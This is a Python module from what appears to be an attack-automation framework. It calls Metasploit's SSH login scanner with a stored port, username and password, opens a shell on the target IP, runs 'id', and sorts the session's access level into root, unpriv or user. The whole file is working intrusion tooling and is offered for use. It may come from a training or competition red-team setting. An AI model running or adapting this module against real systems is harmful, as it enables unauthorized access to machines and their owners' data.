from engine import model
from modules import pymsf

# Set modules options
name = "entry_linux_ssh"  # name
os = "linux"  # os
flavor = "any"  # specific type of os
mod_type = "entry"  # module type -- entry, annoy, persist
mod_lang = "msf"  # bash, msf, cmd, psh
destructive = "False"  # destructive or not
scannable = "False"  # scannable or not (True must include scan() function)
difficulty = "1"  # difficulty -- 1 through 9
priv_required = "none"  # level of access needed - root, user, unpriv (annoy/persist) or none (entry)


# Creates Module object and writes it to the database
def create():
    module = model.Module(name, os, flavor, mod_type, mod_lang, destructive,
                          scannable, difficulty, priv_required)


# handle function
def handle(system, vuln, msf):

    # Set defaults upon failure
    session = False
    access = ""

    # Initialize options from vuln info (should be an idiomatic way to do this)
    port = vuln.mod_info[0]
    username = vuln.mod_info[1]
    password = vuln.mod_info[2]

    # Execute the module
    opts = {
        'RHOSTS': system.ip,
        'RPORT': port,
        'USERNAME': username,
        'PASSWORD': password
    }
    job_id, uuid = msf.execute('auxiliary', 'scanner/ssh/ssh_login', opts)
    if not uuid:
        return (session, access)

    # Get session from job_id and exploit_uuid
    created_session = msf.get_session(job_id, uuid)
    if not created_session:
        return (session, access)

    session = model.Session(created_session, msf)
    access = "user"  # Default expected for this module

    # Get trash motd shell output
    trash = msf.shell_input(session.id, "")

    # Get output of command "id"
    data = msf.shell_input(session.id, "id")
    uid = int(data[b'data'].decode('utf-8').split('=')[1].split('(')[0])

    # Determine access level
    if uid < 1000:
        if uid == 0:
            access = "root"
        else:
            access = "unpriv"
    else:
        access = "user"

    # Final return of session and access level
    return (session, access)
